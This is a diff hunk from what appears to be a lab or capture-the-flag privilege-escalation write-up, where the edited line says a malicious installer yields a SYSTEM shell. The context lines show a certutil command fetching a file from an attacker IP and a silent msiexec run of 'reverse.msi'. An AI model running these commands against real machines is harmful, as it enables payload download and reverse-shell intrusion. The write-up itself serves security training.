@@ -440,7 +440,7 @@ C:\Users\shenzi\Documents>certutil -urlcache -split -f http://192.168.45.151/rev
 CertUtil: -URLCache command completed successfully.
 ```
 
-We can run msiexec to call this and it fires and connects but doesn't give me shell out:
+We can run msiexec to call our `reverse.msi` to fire a shell as SYSTEM:
 
 ```powershell
 C:\Users\Public\Documents>msiexec /quiet /qn /i C:\Users\Public\Documents\reverse.msi
